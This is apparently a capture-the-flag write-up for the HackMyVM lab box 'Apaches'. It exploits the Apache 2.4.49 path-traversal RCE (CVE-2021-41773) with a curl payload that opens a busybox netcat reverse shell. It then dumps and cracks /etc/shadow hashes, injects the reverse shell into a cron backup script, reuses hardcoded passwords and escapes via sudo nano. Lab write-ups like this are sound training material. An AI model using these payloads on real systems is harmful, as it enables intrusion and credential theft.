# Apaches

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.167:22
Open 10.0.2.167:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.167
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bc:95:83:6e:c4:62:38:b5:a9:94:0c:14:a3:bf:57:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjZp8atO6vRCTGOwqjuGUngbAF/pL+YzqIobqPQsc/wnyLRxtduhFvm775wt5E6nrKoeL+EuxO4R3+XAXQq7nRLP9+DcIa03uljeLGGXMRzDQDtz2sQoilqFRn35GCQFiY8mqzEHlGpSptn1aDJLeoyihr//L4UzsT2AH5IqxI234Q0zgbwj2mHRpZTPQM7AbXQxnHOMGgAnT23pJIcjzt5OIvzIZi79hlPbn+CS2VoSq7lSgmQPB8Rp6FwzS92xXNgy4tA+rAKwx8cPdVOxsozZWkJ51gE1QQ5e7WYJz2t2LdCQKXhXZ1GEHniFuSXZwvpp1MPXch/yCdbAwmWej3G2Dp8ScAnnsSBSh3LXM4VewreIXNSgAI67F1TQgqiRXWGpvHrLtAdGsTAqbZg68S9Mah0UxQXNXzZ5WOp5ZWjNkxTOoZri5AINMPrfin2Tyg1PM3qUEcY0ANQu+UUSIKVnJcDeOy2cd3RfZ3cikzfEfu0sc9B1ijp6K0m5hOtB8=
|   256 07:fa:46:1a:ca:f3:dc:08:2f:72:8c:e2:f2:2e:32:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLlz0auLlfftjw5PJX6I+LJqXUfVgWqSmETd5Ts1LJLEVBrMTX4wXnWmTSOgcy8sSA0E1jTbKReY5ejsYU9INnI=
|   256 46:ff:72:d5:67:c5:1f:87:b1:35:84:29:f3:ad:e8:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe1GYTzyP9hWtrRQ0N29auVmnYHAmOYD0RtKhy4uv4U
80/tcp open  http    syn-ack Apache httpd 2.4.49 ((Unix))
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-favicon: Unknown favicon MD5: EB49C4A639D3960EE7DDD07BC9F832B7
|_http-title: Apaches
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Domain name found: `apaches.ctf`

![writeup.png](/assets/pentest/hackmyvm/apaches/writeup.png)

Potential usernames: `Geronimo, Pocahontas, Sacagawea, Squanto`

Passive recon for subdomains shows nothing
```bash
‚îî‚îÄ$ domain='apaches.ctf'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 33940
# Nothing
```

```bash
‚îî‚îÄ$ curl 'http://10.0.2.167/robots.txt'
User-agent: *
Disallow: /

# IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg                                                                                                       
‚îî‚îÄ$ echo 'IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg' | base64 -d
 ‚ÄúYou know your path, child, now follow it.‚Äù
-- Pocahontas 
```

### RCE

```bash
‚îî‚îÄ$ nuclei -u http://10.0.2.167 -tags cve,apache
[CVE-2021-41773:RCE] [http] [high] http://10.0.2.167/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
[CVE-2023-48795] [javascript] [medium] 10.0.2.167:22 ["Vulnerable to Terrapin"]
[apache-detect] [http] [info] http://10.0.2.167 ["Apache/2.4.49 (Unix)"]
```

I was not able to get LFI to work, but RCE worked however blind execution.

![writeup-1.png](/assets/pentest/hackmyvm/apaches/writeup-1.png)

```bash
‚îî‚îÄ$ curl 'http://10.0.2.167/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --path-as-is -d 'busybox nc 10.0.2.149 4444 -e /bin/bash'
---
‚îî‚îÄ$ penelope -p 4444
daemon@apaches:/usr/bin$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Lateral Movement

Daemon service user can read `shadow`
```bash
daemon@apaches:/tmp$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
geronimo:x:1000:1000:geronimo:/home/geronimo:/bin/bash
squanto:x:1001:1001:,,,:/home/squanto:/bin/bash
sacagawea:x:1002:1002:,,,:/home/sacagawea:/bin/bash
pocahontas:x:1003:1003:,,,:/home/pocahontas:/bin/bash

daemon@apaches:/tmp$ grep '\$' /etc/shadow
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::
```

```powershell
PS C:\Users\pvpga\VBoxShare> john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
iamtheone        (squanto)
```

## SSH

```bash
‚îî‚îÄ$ sshpass -p 'iamtheone' ssh squanto@10.0.2.167
squanto@apaches:~$ id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
```

## Privilege Escalation (sacagawea)

```bash
squanto@apaches:~$ find / -perm -4000 -ls 2>/dev/null | grep -v /snap/
# No usable SUIDs
squanto@apaches:~$ getcap -r / 2>/dev/null
# No usable Capabilities
```

```bash
squanto@apaches:~$ cat todo.md
### Development

- [x] Apaches frontpage
- [ ] Portal for administration
- [ ] Database selection for administration
- [ ] Hardening the system for attacks
```

Looks like this backup script runs as `sacagawea`
```bash
squanto@apaches:~$ cat /etc/crontab
...
#* 5 * * * * su sacagawea -c "./home/sacagawea/Scripts/backup.sh"
```

```bash
squanto@apaches:~$ cat /home/sacagawea/Scripts/backup.sh
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
```

Script is writable by Lipan group which we are part of
```bash
squanto@apaches:/tmp$ ls -l /home/sacagawea/Scripts/backup.sh
-rwxrwx--- 1 sacagawea Lipan 185 Jan  3 07:48 /home/sacagawea/Scripts/backup.sh
```

```bash
squanto@apaches:/tmp$ echo 'busybox nc 10.0.2.149 4444 -e /bin/bash' >> /home/sacagawea/Scripts/backup.sh
```

```bash
[+] Got reverse shell from apaches~10.0.2.167-Linux-x86_64 üòçÔ∏è Assigned SessionID <2>
daemon@apaches:/tmp$ # Press F12
[!] Session detached ‚á≤
(Penelope)‚îÄ(Session [1])> sessions 2
sacagawea@apaches:~$ id
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

### User.txt

```bash
sacagawea@apaches:~$ tail -1 user.txt
Flag: FlagsNeverQuitNeitherShouldYou
```

## Privilege Escalation (pocahontas)

```bash
sacagawea@apaches:~/Development/admin$ cat 2-check.php
...
  $users = [
    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
    "sacagawea" => "cU21X8&uGswgYsL!raXC"
  ];
...
```

Try passwords
```bash
sacagawea@apaches:~/Development/admin$ timeout 1 echo '12u7D9@4IA9uBO4pX9#6jZ3456' | su - geronimo -c id
Password:
su: Authentication failure
sacagawea@apaches:~/Development/admin$ timeout 1 echo 'y2U1@8Ie&OHwd^Ww3uAl' | su - pocahontas -c id
Password: uid=1003(pocahontas) gid=1003(pocahontas) groups=1003(pocahontas)
sacagawea@apaches:~/Development/admin$ timeout 1 echo '4Rl3^K8WDG@sG24Hq@ih' | su - squanto -c id
Password: su: Authentication failure
sacagawea@apaches:~/Development/admin$ timeout 1 echo 'cU21X8&uGswgYsL!raXC' | su - sacagawea -c id
Password: su: Authentication failure
```

```bash
pocahontas@apaches:~$ id
uid=1003(pocahontas) gid=1003(pocahontas) groups=1003(pocahontas)
```

## Privilege Escalation (geronimo)

```bash
pocahontas@apaches:~$ sudo -l
[sudo] password for pocahontas: y2U1@8Ie&OHwd^Ww3uAl
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano
```

- [https://gtfobins.github.io/gtfobins/nano/](https://gtfobins.github.io/gtfobins/nano/)

```bash
pocahontas@apaches:~$ sudo -u geronimo nano
^R^X
reset; bash 1>&0 2>&0

geronimo@apaches:/home/pocahontas$ id
uid=1000(geronimo) gid=1000(geronimo) groups=1000(geronimo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

```bash
geronimo@apaches:~$ sudo -l
Matching Defaults entries for geronimo on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User geronimo may run the following commands on apaches:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

### Root.txt

```
geronimo@apaches:~$ sudo su
root@apaches:/home/geronimo# tail -1 /root/root.txt
Flag: OneSingleVulnerabilityAllAnAttackerNeeds
```